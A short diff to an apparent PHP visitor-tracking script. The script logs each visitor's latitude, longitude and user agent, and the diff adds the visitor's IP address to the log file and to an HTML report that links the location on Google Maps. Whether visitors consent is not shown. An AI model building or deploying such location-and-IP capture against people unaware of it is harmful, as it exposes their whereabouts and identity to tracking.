@@ -27,8 +27,11 @@ $latitude = $visitorInfo['latitude'] ?? 'Unknown';
 $longitude = $visitorInfo['longitude'] ?? 'Unknown';
 $userAgent = $visitorInfo['userAgent'] ?? 'Unknown';
 
-// Log the decoded data to check values (optional)
-file_put_contents('log.txt', "Decoded Data: Latitude: $latitude, Longitude: $longitude, User Agent: $userAgent\n", FILE_APPEND);
+// Get the IP address of the visitor
+$ipAddress = $_SERVER['REMOTE_ADDR'];
+
+// Log the decoded data and IP address to check values (optional)
+file_put_contents('log.txt', "Decoded Data: Latitude: $latitude, Longitude: $longitude, User Agent: $userAgent, IP Address: $ipAddress\n", FILE_APPEND);
 
 // Construct Google Maps link to show the location
 $googleMapsLink = "https://www.google.com/maps?q={$latitude},{$longitude}";
@@ -55,6 +58,7 @@ try {
         <p><strong>Latitude:</strong> {$latitude}</p>
         <p><strong>Longitude:</strong> {$longitude}</p>
         <p><strong>Browser Info:</strong> {$userAgent}</p>
+        <p><strong>IP Address:</strong> {$ipAddress}</p>
         <p><strong>View Location:</strong> <a href='{$googleMapsLink}' target='_blank'>Click here to view on Google Maps</a></p>
     ";
 
